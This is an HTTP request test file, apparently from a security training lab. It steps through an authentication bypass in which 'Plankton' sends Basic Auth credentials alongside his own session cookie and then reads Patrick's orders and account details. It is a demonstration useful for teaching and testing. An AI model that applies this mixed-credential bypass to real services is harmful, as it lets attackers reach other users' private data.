# @import ../common/setup.http
@host = {{base_host}}/v201

### Mobile app still uses Basic Auth for user authentication
GET /orders
Authorization: {{patrick_auth}}


### But on the web app there is a login form that sets a session cookie
# Plankton logins into his own account
POST /auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

@session = {{refreshCookie(response)}}

### Now Plankton can also access his own orders via cookie authentication
GET /orders
Cookie: {{session}}

?? status == 200
?? js response.parsedBody[0].user_id == plankton@chum-bucket.sea

### However, Plankton wonders what would happen if he sends the request with Basic Auth and a session cookie
# He tries to access Patrick's orders without knowing his password
GET /orders
Authorization: {{patrick_auth}}
Cookie: {{session}}

?? status == 200
?? js response.parsedBody[0].user_id == patrick@bikinibottom.sea


### If we access account info, we see that we are logged in as Patrick
GET /account/info
Authorization: {{patrick_auth}}
Cookie: {{session}}

?? status == 200
?? js response.parsedBody.email == patrick@bikinibottom.sea

{{
  console.info("EXPLOIT: Plankton accessed Patrick's account using stolen Basic Auth + his own session cookie!");
}}
